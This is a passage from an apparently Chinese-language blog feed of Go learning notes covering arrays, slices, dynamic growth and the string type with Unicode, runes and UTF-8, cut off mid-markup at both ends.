class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">foo</span><span class="params">(arr [5]<span class="keyword">int</span>)</span></span> &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">var</span> arr1 [<span class="number">5</span>]<span class="keyword">int</span></span><br><span class="line">    <span class="keyword">var</span> arr2 [<span class="number">6</span>]<span class="keyword">int</span></span><br><span class="line">    <span class="keyword">var</span> arr3 [<span class="number">5</span>]<span class="keyword">string</span></span><br><span class="line">    foo(arr1) <span class="comment">// 正常编译</span></span><br><span class="line">    foo(arr2) <span class="comment">// 编译失败：[6]int与函数foo参数的类型[5]int不是同一数组类型</span></span><br><span class="line">    foo(arr3) <span class="comment">// 编译失败：[5]string与函数foo参数的类型[5]int不是同一数组类型</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在上面的示例代码中，arr2 与 arr3 两个变量的类型分别为<code>[6]int</code> 和 <code>[5]string</code>，前者的长度属性与<code>[5]int</code> 不一致，后者的元素类型属性与<code>[5]int</code> 不一致，因此这两个变量都不能作为调用函数 foo 时的实际参数。</p><h2 id="数组在内存中的存储"><a href="#数组在内存中的存储" class="headerlink" title="数组在内存中的存储"></a>数组在内存中的存储</h2><p>数组类型<strong>不仅是逻辑上的连续序列，而且在实际内存分配时也占据着一整块内存。</strong></p><p>Go 编译器在为数组类型的变量实际分配内存时，会为 Go 数组分配一整块、可以容纳它所有元素的连续内存，如下图所示：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20221103114257.png" alt=""></p><p>从上面这张图中可以看到，这块内存全部空间都被用来表示数组元素，所以可以说这块内存的大小，等同于各数组元素的大小之和（物理上的）。</p><p>如果两个数组所分配的内存大小不同，那么它们肯定是不同的数组类型，因为只有两个变量<code>N 和 T</code>完全相同，结果才会相同。</p><p>Go 提供了预定义函数 len 可以用于获取一个数组类型变量的长度，通过 unsafe 包提供的 Sizeof 函数，我们可以获得一个数组变量的总大小，如下面代码：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="number">6</span>]<span class="keyword">int</span>&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>&#125;</span><br><span class="line">fmt.Println(<span class="string">"数组长度："</span>, <span class="built_in">len</span>(arr))            <span class="comment">// 6</span></span><br><span class="line">fmt.Println(<span class="string">"数组大小："</span>, unsafe.Sizeof(arr))  <span class="comment">// 48</span></span><br></pre></td></tr></table></figure><p>数组大小就是所有元素的大小之和，这里数组元素的类型为 int。在 64 位平台上，int 类型的大小为 8，数组 arr 一共有 6 个元素，因此它的总大小为 6x8=48 个字节。</p><h3 id="显式初始化"><a href="#显式初始化" class="headerlink" title="显式初始化"></a>显式初始化</h3><p>和基本数据类型一样，声明一个数组类型变量的同时，也可以显式地对它进行初始化。如果不进行显式初始化，那么数组中的元素值就是它类型的零值。比如下面的数组类型变量 arr1 的各个元素值都为 0：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> arr1 [<span class="number">6</span>]<span class="keyword">int</span> <span class="comment">// [0 0 0 0 0 0]</span></span><br></pre></td></tr></table></figure><p>显示初始化，需要在右值中显式放置数组类型，并通过大括号的方式给各个元素赋值：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 注意最后面的逗号不能少</span></span><br><span class="line"><span class="keyword">var</span> arr2 = [<span class="number">6</span>]<span class="keyword">int</span> &#123;</span><br><span class="line">    <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">16</span>,</span><br><span class="line">&#125; <span class="comment">// [11 12 13 14 15 16]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 忽略掉右值初始化表达式中数组类型的长度，用 … 替代</span></span><br><span class="line"><span class="keyword">var</span> arr3 = [...]<span class="keyword">int</span> &#123; </span><br><span class="line">    <span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>,</span><br><span class="line">&#125; <span class="comment">// [21 22 23]</span></span><br><span class="line">fmt.Printf(<span class="string">"%T\n"</span>, arr3) <span class="comment">// [3]int</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 将第100个元素(下标值为99)的值赋值为39，其余元素值均为0</span></span><br><span class="line"><span class="keyword">var</span> arr4 = [...]<span class="keyword">int</span>&#123;</span><br><span class="line">    <span class="number">99</span>: <span class="number">39</span>, </span><br><span class="line">&#125; <span class="comment">// [...39]</span></span><br></pre></td></tr></table></figure><h2 id="多维数组"><a href="#多维数组" class="headerlink" title="多维数组"></a>多维数组</h2><p>数组出了一维数组，还有多维数组，在Go 语言中，使用如下方式声明一个多维数组：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> mArr [<span class="number">2</span>][<span class="number">3</span>][<span class="number">4</span>]<span class="keyword">int</span></span><br></pre></td></tr></table></figure><p>有其他语言基础的话，多维数组并不难理解，上面这段示例代码，可以拆解成这样：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20221103214338.png" alt=""></p><h2 id="切片"><a href="#切片" class="headerlink" title="切片"></a>切片</h2><p>因为数组在使用上有两点不足：固定的元素个数，以及传值机制下导致的开销较大。<br>于是 Go 设计者们又引入了另外一种同构复合类型——切片（slice），来弥补数组的这两点不足。</p><p>切片和数组就长得很像，但又各有各的行为特点。</p><p>声明一个切片：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> nums = []<span class="keyword">int</span>&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>&#125;</span><br></pre></td></tr></table></figure><p>可以看到与声明数组相比，切片的声明仅仅只是少了一个长度属性，正因为没有长度的束缚，切片展现出更为灵活的特性。</p><p>虽然不需要像数组那样在声明时指定长度，但切片也有自己的长度，只不过这个长度不是固定的，而是随着切片中元素个数的变化而变化的。\</p><p>可以通过 len 函数获得切片类型变量的长度。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fmt.Println(<span class="built_in">len</span>(nums)) <span class="comment">// 6</span></span><br></pre></td></tr></table></figure><h2 id="切片在内存中的存储"><a href="#切片在内存中的存储" class="headerlink" title="切片在内存中的存储"></a>切片在内存中的存储</h2><p>Go 切片在运行时其实是一个三元组结构，它在 Go 运行时中的表示如下：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// $GOROOT/src/runtime/slice.go</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> slice <span class="keyword">struct</span> &#123;</span><br><span class="line">    array unsafe.Pointer</span><br><span class="line">    <span class="built_in">len</span>   <span class="keyword">int</span></span><br><span class="line">    <span class="built_in">cap</span>   <span class="keyword">int</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>每个切片包含三个字段：</p><ul><li>array：是指向底层数组的指针</li><li>len：是切片的长度，即切片中当前元素的个数</li><li>cap：是底层数组的长度，也是切片的最大容量，cap 值永远大于等于 len 值</li></ul><p>示例代码中的 nums 变量，在内存中的表示，如下图所示：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20221103215619.png" alt=""><br>这里有一个概念需要理解</p><p>创建一个切片有几种方式，下面一一介绍。</p><h3 id="make-函数"><a href="#make-函数" class="headerlink" title="make 函数"></a>make 函数</h3><p>通过 make 函数来创建切片，并指定底层数组的长度：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sl := <span class="built_in">make</span>([]<span class="keyword">byte</span>, <span class="number">6</span>, <span class="number">10</span>)</span><br></pre></td></tr></table></figure><p>如果没有在 make 中指定 cap 参数，那么底层数组长度 cap 就等于 len，比如：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sl := <span class="built_in">make</span>([]<span class="keyword">byte</span>, <span class="number">6</span>) <span class="comment">// cap = len = 6</span></span><br></pre></td></tr></table></figure><h3 id="数组的切片化"><a href="#数组的切片化" class="headerlink" title="数组的切片化"></a>数组的切片化</h3><p>采用 <code>array[low : high : max]</code>语法基于一个已存在的数组创建切片：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">arr := [<span class="number">10</span>]<span class="keyword">int</span>&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>&#125;</span><br><span class="line"></span><br><span class="line">sl := arr[<span class="number">3</span>:<span class="number">7</span>:<span class="number">9</span>]</span><br></pre></td></tr></table></figure><p>基于数组 arr 创建了一个切片 sl，这个切片 sl 在运行时中的表示是这样：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20221103220601.png" alt=""><br>基于数组创建切片时，</p><ul><li>起始元素：low 所标识的索引开始</li><li>len：切片的长度 = high - low</li><li>cap：最大容量 = max - low</li><li>array：指向原数组</li></ul><p>由于切片 sl 的底层数组就是数组 arr，对切片 sl 中元素的修改将直接影响数组 arr 变量：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sl[<span class="number">0</span>] += <span class="number">10</span></span><br><span class="line">fmt.Println(<span class="string">"arr[3] ="</span>, arr[<span class="number">3</span>])   <span class="comment">// 14</span></span><br></pre></td></tr></table></figure><p>针对一个已存在的数组，可以建立多个操作数组的切片，这些切片共享同一底层数组，所以操作其中一个切片时，会影响其他切片（<strong>切片好比打开了一个访问与修改数组的“窗口”</strong>）。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">arr := [<span class="number">10</span>]<span class="keyword">int</span>&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>&#125;</span><br><span class="line"></span><br><span class="line">sl := arr[<span class="number">3</span>:<span class="number">7</span>:<span class="number">9</span>]</span><br><span class="line">sl2 = arr[<span class="number">1</span>,<span class="number">4</span>,<span class="number">10</span>]</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20221103221542.png" alt=""></p><p>常见操作：</p><ul><li><code>s[n]</code>：切片 s 中索引位置为 n 的项</li><li><code>s[:]</code>：从切片 s 的索引位置 0 到 len(s)-1 处所获得的切片</li><li><code>s[low:]</code>：从切片 s 的索引位置 low 到 len(s)-1 处所获得的切片</li><li><code>s[:high]</code>：从切片 s 的索引位置 0 到 high 处所获得的切片，len = high</li><li><code>s[low:high]</code>：从切片 s 的索引位置 low 到 high 处所获得的切片，len = high-low</li><li><code>s[low:high:max]</code>：从切片 s 的索引位置 low 到 high 所获得的切片，len = high-low, cap = max-low</li><li><code>len(s)</code>：切片 s 的长度，总是 &lt;= cap(s)</li><li><code>cap(s)</code>：切片 s 的容量，总是 &gt;= len(s)</li></ul><h3 id="切片创建切片"><a href="#切片创建切片" class="headerlink" title="切片创建切片"></a>切片创建切片</h3><h2 id="动态扩容"><a href="#动态扩容" class="headerlink" title="动态扩容"></a>动态扩容</h2><p>切片与数组最大的不同，就在于其长度的不定长，这种不定长需要 Go 运行时提供支持，这种支持就是切片的“动态扩容”。</p><p>“动态扩容”指的就是，当使用 append 操作向切片追加数据的时候，如果这时切片的 len 值和 cap 值是相等的，也就是说切片底层数组已经没有空闲空间再来存储追加的值了，Go 运行时就会对这个切片做扩容操作，来保证切片始终能存储下追加的新值。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> s []<span class="keyword">int</span></span><br><span class="line">s = <span class="built_in">append</span>(s, <span class="number">11</span>) </span><br><span class="line">fmt.Println(<span class="built_in">len</span>(s), <span class="built_in">cap</span>(s)) <span class="comment">//1 1</span></span><br><span class="line">s = <span class="built_in">append</span>(s, <span class="number">12</span>) </span><br><span class="line">fmt.Println(<span class="built_in">len</span>(s), <span class="built_in">cap</span>(s)) <span class="comment">//2 2</span></span><br><span class="line">s = <span class="built_in">append</span>(s, <span class="number">13</span>) </span><br><span class="line">fmt.Println(<span class="built_in">len</span>(s), <span class="built_in">cap</span>(s)) <span class="comment">//3 4</span></span><br><span class="line">s = <span class="built_in">append</span>(s, <span class="number">14</span>) </span><br><span class="line">fmt.Println(<span class="built_in">len</span>(s), <span class="built_in">cap</span>(s)) <span class="comment">//4 4</span></span><br><span class="line">s = <span class="built_in">append</span>(s, <span class="number">15</span>) </span><br><span class="line">fmt.Println(<span class="built_in">len</span>(s), <span class="built_in">cap</span>(s)) <span class="comment">//5 8</span></span><br></pre></td></tr></table></figure><p>下面用一张图来解释动态扩容的过程：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/spliceAppend.png" alt=""><br>其中有几点需要注意：</p><ul><li>每一次 cap 的值的变化是按一定规律扩展的（1 =&gt; 2 =&gt; 4 =&gt; 8）</li><li>自动扩容触碰到底层数组边界时，再次 append 会导致切片与数组“绑定关系”，也就是修改切片的第一个元素值时，原数组 u 的元素也不会发生改变了</li></ul><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul><li>数组是一个长度固定、由相同类型元素组成的连续序列，在内存中占据一块连续的空间</li><li>数组的不足：固定的元素个数，以及值拷贝的传值机制导致开销较大</li><li>切片与数组最大的不同，就在于其长度的不定长，这种不定长需要 Go 运行时提供支持，这种支持就是切片的“动态扩容”。</li></ul><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://time.geekbang.org/column/intro/100093501" target="_blank" rel="noopener">Tony Bai · Go 语言第一课</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Go </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Go </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Go 语言学习笔记——字符串</title>
      <link href="/go-language-study-notes-string/"/>
      <url>/go-language-study-notes-string/</url>
      
        <content type="html"><![CDATA[<p>Go 语言原生支持字符串。</p><a id="more"></a><p>作为一个站在巨人的肩膀上成长起来的现代编程语言。它继承了前辈语言的优点，又改进了前辈语言中的不足。这其中一处就体现在 Go 对字符串类型的原生支持上。</p><p>在C 语言中，并没有对应的字符串变量，不会像 PHP 语言专门有一个<code>String</code> 类型来存储对应的字符变量，那么是存储字符串的呢？</p><p>在C 语言中，是通过字符数组来存储字符串的：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> c[] = <span class="string">"clang"</span>;</span><br></pre></td></tr></table></figure><p>字符串是由字符组成的，对于计算机而言，字符串是由一个个字符组成的，而一个字符的大小是一个字节。<br>clang 这个字符串在计算机中，所占的大小是六个字节而不是五个，这是因为最后一个字符是由<code>\0</code> 结尾，也需要占用一个字节。</p><p>这样定义的非原生字符串在使用过程中会有很多问题，比如：</p><ul><li>不是原生类型，编译器不会对它进行类型校验，导致类型安全性差</li><li>字符串操作时要时刻考虑结尾的<code>\0</code>，防止缓冲区溢出</li><li>以字符数组形式定义的“字符串”，它的值是可变的，在并发场景中需要考虑同步问题</li><li>获取一个字符串的长度代价较大，通常是 O(n) 时间复杂度</li><li>C 语言没有内置对非 ASCII 字符（如中文字符）的支持</li></ul><p>这些问题都大大加重了开发人员在使用字符串时的心智负担。于是，Go 设计者们选择了原生支持字符串类型。</p><p>在 Go 中，字符串类型为 string。</p><p>Go 语言通过 string 类型统一了对“字符串”的抽象。这样无论是字符串常量、字符串变量或是代码中出现的字符串字面值，它们的类型都被统一设置为 string，比如上面 C 代码换成等价的 Go 代码是这样的：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> c = <span class="string">"clang"</span></span><br></pre></td></tr></table></figure><h2 id="原生支持字符串的优势"><a href="#原生支持字符串的优势" class="headerlink" title="原生支持字符串的优势"></a>原生支持字符串的优势</h2><h3 id="字符串类型数据不可变"><a href="#字符串类型数据不可变" class="headerlink" title="字符串类型数据不可变"></a>字符串类型数据不可变</h3><p>这里并不是说不能为一个字符串类型变量进行二次赋值，而是不能改变字符的值：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">s := <span class="string">"golang"</span></span><br><span class="line">s[<span class="number">0</span>] = <span class="string">'c'</span>   <span class="comment">// 错误：cannot assign to s[0] (value of type byte)</span></span><br><span class="line">s = <span class="string">"gopher"</span> <span class="comment">// ok</span></span><br></pre></td></tr></table></figure><p>这样设计不用再担心字符串的并发安全问题。</p><h3 id="没有结尾"><a href="#没有结尾" class="headerlink" title="没有结尾"></a>没有结尾</h3><p>Go 字符串中没有结尾 <code>\0</code>，获取字符串长度更不需要结尾 <code>\0</code> 作为结束标志。</p><p>并且，Go 获取字符串长度是一个常数级时间复杂度，无论字符串中字符个数有多少，都可以快速得到字符串的长度值（后面会解释）。</p><h3 id="所见即所得"><a href="#所见即所得" class="headerlink" title="所见即所得"></a>所见即所得</h3><p>常常会需要对字符串进行拼接，因为转义字符的存在，较难控制好格式，在 Go 语言中，通过一对反引号原生支持构造“所见即所得”的原始字符串（Raw String）。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> s <span class="keyword">string</span> = <span class="string">`         ,_---~~~~~----._</span></span><br><span class="line"><span class="string">    _,,_,*^____      _____*g*\"*,--,</span></span><br><span class="line"><span class="string">   / __/ /'     ^.  /      \ ^@q   f</span></span><br><span class="line"><span class="string">  [  @f | @))    |  | @))   l  0 _/</span></span><br><span class="line"><span class="string">   \/   \~____ / __ \_____/     \</span></span><br><span class="line"><span class="string">    |           _l__l_           I</span></span><br><span class="line"><span class="string">    &#125;          [______]           I</span></span><br><span class="line"><span class="string">    ]            | | |            |</span></span><br><span class="line"><span class="string">    ]             ~ ~             |</span></span><br><span class="line"><span class="string">    |                            |</span></span><br><span class="line"><span class="string">     |                           |`</span></span><br><span class="line">fmt.Println(s)</span><br></pre></td></tr></table></figure><p>在原始字符串中的任意转义字符都不会起到转义的作用。</p><h3 id="Unicode-字符集支持"><a href="#Unicode-字符集支持" class="headerlink" title="Unicode 字符集支持"></a>Unicode 字符集支持</h3><p>在之前的笔记中，已经提到过，Go 语言源文件默认采用的是 Unicode 字符集，Unicode 字符集是目前最流行的字符集，它囊括了几乎所有主流非 ASCII 字符（包括中文字符）。</p><p>对非 ASCII 字符提供原生支持，消除了源码在不同环境下显示乱码的可能。</p><h2 id="字符串的组成"><a href="#字符串的组成" class="headerlink" title="字符串的组成"></a>字符串的组成</h2><p>下面会从两个角度认识字符串：</p><ul><li>字节视角：Go 字符串是由一个可空的<strong>字节序列</strong>组成，字节的个数称为字符串的长度</li><li>字符视角：Go 字符串是由一个可空的<strong>字符序列</strong>构成，字符串中的每个字符都是一个 Unicode 字符</li></ul><h3 id="字节视角"><a href="#字节视角" class="headerlink" title="字节视角"></a>字节视角</h3><p><strong>Go 语言中的字符串值也是一个可空的字节序列，字节序列中的字节个数称为该字符串的长度。一个个的字节只是孤立数据，不表意。</strong></p><p>从字节视角看字符串的构成，它是不表示字符含义的（通俗点说就是，单从输出的字节是看不出来对应的是什么字符），这里输出的是字符串中的所有字节。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> s = <span class="string">"中国人"</span></span><br><span class="line">fmt.Printf(<span class="string">"the length of s = %d\n"</span>, <span class="built_in">len</span>(s)) <span class="comment">// 9</span></span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="built_in">len</span>(s); i++ &#123;</span><br><span class="line">  fmt.Printf(<span class="string">"0x%x "</span>, s[i])</span><br><span class="line">  <span class="comment">// 0xe4 0xb8 0xad 0xe5 0x9b 0xbd 0xe4 0xba 0xba</span></span><br><span class="line">  <span class="comment">// 至于这个是什么，后面会解释</span></span><br><span class="line">&#125;</span><br><span class="line">fmt.Printf(<span class="string">"\n"</span>)</span><br></pre></td></tr></table></figure><p>因为一个中文汉字由 3~4 个字节组成，“中国人”是三个汉字，所以这里是 <code>3 x 3 = 9</code> 个字节。</p><h3 id="字符视角"><a href="#字符视角" class="headerlink" title="字符视角"></a>字符视角</h3><p>如果需要表意，则需要从字符视角来看了，也就是<strong>字符串是由一个可空的字符序列构成</strong>。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> s = <span class="string">"中国人"</span></span><br><span class="line">fmt.Println(<span class="string">"the character count in s is"</span>, utf8.RuneCountInString(s)) <span class="comment">// 3</span></span><br><span class="line"><span class="keyword">for</span> _, c := <span class="keyword">range</span> s &#123;</span><br><span class="line">  fmt.Printf(<span class="string">"0x%x "</span>, c)</span><br><span class="line">  <span class="comment">// 0x4e2d 0x56fd 0x4eba</span></span><br><span class="line">&#125;</span><br><span class="line">fmt.Printf(<span class="string">"\n"</span>)</span><br></pre></td></tr></table></figure><p>在这段代码中，不仅输出了字符串中的字符数量，还输出了字符串中的每个字符。</p><p>Go 采用的是 Unicode 字符集，每个字符都是一个 Unicode 字符，每个字符都可以在 Unicode 字符集中找到，这里输出的 <a href="https://www.qqxiuzi.cn/zh/unicode-zifu.php?z=4E2D&plane=0&ks=4000&js=4FFF#4E00" target="_blank" rel="noopener">0x4e2d</a>、<a href="https://www.qqxiuzi.cn/zh/unicode-zifu.php?z=56FD&plane=0&ks=5000&js=5FFF#5600" target="_blank" rel="noopener">0x56fd</a> 和 <a href="0x4eba">0x4eba</a> 就是 中国人 这三个汉字在 Unicode 字符集中的码点（Code Point）</p><p>可以在<a href="https://www.qqxiuzi.cn/zh/unicode-zifu.php" target="_blank" rel="noopener">这个网站</a>查找世界文字对应的 Unicode  码点。</p><p>那么，什么是 Unicode 码点呢？<br>因为 Unicode 字符集中的每个字符，按照一定规则，都被分配了统一且唯一的字符编号。所谓的码点，就是指将 Unicode 字符集中的所有字符“排成一队”，字符在这个“队伍”中的位置，就是它在 Unicode 字符集中的码点。</p><h2 id="rune-类型与字符字面值"><a href="#rune-类型与字符字面值" class="headerlink" title="rune 类型与字符字面值"></a>rune 类型与字符字面值</h2><p>Go 使用 <strong>rune 这个类型来表示一个 Unicode 码点</strong>。rune 本质上是 int32 类型的别名类型，它与 int32 类型是完全等价的，在 Go 源码中我们可以看到它的定义是这样的：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// $GOROOT/src/builtin.go</span></span><br><span class="line"><span class="keyword">type</span> <span class="keyword">rune</span> = <span class="keyword">int32</span></span><br></pre></td></tr></table></figure><p>由于一个 Unicode 码点唯一对应一个 Unicode 字符。所以可以说，<strong>一个 rune 实例就是一个 Unicode 字符，一个 Go 字符串也可以被视为 rune 实例的集合。我们可以通过字符字面值来初始化一个 rune 变量</strong>。</p><h3 id="字符字面值"><a href="#字符字面值" class="headerlink" title="字符字面值"></a>字符字面值</h3><p>在 Go 中，字符字面值有多种表示法，最常见的是通过<strong>单引号括起的字符字面值</strong>，比如：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'a'</span>  <span class="comment">// ASCII字符</span></span><br><span class="line"><span class="string">'中'</span> <span class="comment">// Unicode字符集中的中文字符</span></span><br><span class="line"><span class="string">'\n'</span> <span class="comment">// 换行字符</span></span><br><span class="line"><span class="string">'\''</span> <span class="comment">// 单引号字符</span></span><br></pre></td></tr></table></figure><h3 id="字符串字面值"><a href="#字符串字面值" class="headerlink" title="字符串字面值"></a>字符串字面值</h3><p>字符串是字符的集合，将表示单个字符的单引号，换为表示多个字符组成的字符串的双引号，就可以用来表示字符串字面值了：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"abc\n"</span></span><br><span class="line"><span class="string">"中国人"</span></span><br><span class="line"><span class="string">"\u4e2d\u56fd\u4eba"</span> <span class="comment">// 中国人</span></span><br><span class="line"><span class="string">"\U00004e2d\U000056fd\U00004eba"</span> <span class="comment">// 中国人</span></span><br><span class="line"><span class="string">"中\u56fd\u4eba"</span> <span class="comment">// 中国人，不同字符字面值形式混合在一起</span></span><br><span class="line"><span class="string">"\xe4\xb8\xad\xe5\x9b\xbd\xe4\xba\xba"</span> <span class="comment">// 十六进制表示的字符串字面值：中国人</span></span><br></pre></td></tr></table></figure><p>将单个 Unicode 字符字面值一个接一个地连在一起（示例中的第三行），并用双引号包裹起来就构成了字符串字面值。</p><p>不过，奇怪的是，为什么示例中的最后一行，与之前 Unicode 的码点对不上，反而很像从字节序列中输出的内容？</p><p>这是因为这个字节序列实际上是 中国人 这个 Unicode 字符串的 UTF-8 编码值。</p><h2 id="UTF-8-编码方案"><a href="#UTF-8-编码方案" class="headerlink" title="UTF-8 编码方案"></a>UTF-8 编码方案</h2><p>UTF-8 编码解决的是 Unicode 码点值在计算机中如何<strong>存储</strong>和<strong>表示</strong>（位模式）的问题。</p><p>既然码点可以确定一个 Unicode 字符，那么直接用码点不行吗？</p><p>确实可以，而且 UTF-32 编码标准就是采用的这个方案。UTF-32 编码方案固定使用 4 个字节表示每个 Unicode 字符码点，这带来的好处就是编解码简单，但缺点也很明显，主要有下面几点：</p><ul><li>这种编码方案使用 4 个字节存储和传输一个整型数的时候，需要考虑不同平台的字节序问题 </li><li>由于采用 4 字节的固定长度编码，与采用 1 字节编码的 ASCII 字符集无法兼容</li><li>所有 Unicode 字符码点都用 4 字节编码，显然空间利用率很差</li></ul><p>针对这些问题，Go 语言之父 Rob Pike 发明了 UTF-8 编码方案。<br>和 UTF-32 方案不同，<strong>UTF-8 方案使用变长度字节</strong>，对 Unicode 字符的码点进行编码。编码采用的字节数量与 Unicode 字符在码点表中的序号有关：<strong>表示序号（码点）小的字符使用的字节数量少，表示序号（码点）大的字符使用的字节数多。</strong></p><p>UTF-8 编码使用的字节数量从 1 个到 4 个不等。</p><ul><li>前 128 个与 ASCII 字符重合的码点（U+0000~U+007F）使用 1 个字节表示</li><li>带变音符号的拉丁文、希腊文、西里尔字母、阿拉伯文等使用 2 个字节来表示</li><li>而东亚文字（包括汉字）使用 3 个字节表示</li><li>其他极少使用的语言的字符则使用 4 个字节表示</li></ul><p>有关字符编码的更多知识，可以查看<a href="https://www.0x2beace.com/ascii-unicode-and-utf-8/">这篇笔记</a>。</p><p>现在使用 Go 在标准库中提供的 UTF-8 包，对 Unicode 字符（rune）进行编解码试试看：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span 